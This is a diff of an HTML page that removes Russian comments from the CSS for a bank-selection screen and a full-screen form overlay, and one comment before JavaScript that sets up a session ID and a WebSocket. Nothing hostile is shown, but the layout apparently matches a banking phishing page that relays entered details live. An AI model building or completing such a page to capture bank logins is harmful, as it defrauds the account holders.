@@ -17,23 +17,22 @@
         .screen { padding: 20px; transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out; }
         #bank-selection-screen { opacity: 1; transform: scale(1); }
         
-        /* --- ИЗМЕНЕНИЕ ЗДЕСЬ (ГИБРИДНЫЙ МЕТОД) --- */
         #form-screen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             opacity: 0; visibility: hidden; transform: scale(1.05);
             transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out, visibility 0s 0.5s;
-            display: flex; /* Используем Flexbox для вертикального центрирования */
-            align-items: center; /* Выравниваем по центру по вертикали */
+            display: flex; 
+            align-items: center;
             padding: 20px;
         }
         .form-container {
             width: 100%; max-width: 380px; 
-            margin-left: auto; /* Авто-отступ слева */
-            margin-right: auto; /* Авто-отступ справа (это гарантирует центрирование по горизонтали) */
+            margin-left: auto; 
+            margin-right: auto; 
             background-color: var(--white); padding: 30px; border-radius: 20px;
             box-shadow: 0 15px 40px rgba(0,0,0,0.2);
         }
-        /* --- КОНЕЦ ИЗМЕНЕНИЙ --- */
+        
 
         body.form-active { background: var(--bg-gradient); overflow: hidden; }
         body.form-active #bank-selection-screen { opacity: 0; transform: scale(0.95); pointer-events: none; }
@@ -106,7 +105,7 @@
     </div>
 
 <script>
-    // Весь JavaScript остается без изменений, так как он уже правильный
+    
 document.addEventListener('DOMContentLoaded', () => {
     const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
     let ws;
